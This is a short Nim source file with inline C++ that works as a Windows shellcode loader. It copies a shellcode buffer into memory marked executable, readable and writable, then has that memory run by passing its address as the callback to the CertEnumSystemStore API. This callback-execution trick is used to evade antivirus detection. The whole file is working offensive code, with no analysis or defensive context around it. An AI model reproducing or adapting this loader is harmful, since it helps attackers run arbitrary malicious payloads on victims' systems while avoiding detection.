{.passL:"-l Crypt32".}
import public

{.emit: """
#include <wincrypt.h>
int CertEnumSystem(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);
    ::CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)addr);
}
""".}

proc CertEnumSystem(plainBuffer:cstring,size:cint):cint {.importcpp:"CertEnumSystem(@)",nodecl.}

discard CertEnumSystem(code,codelen)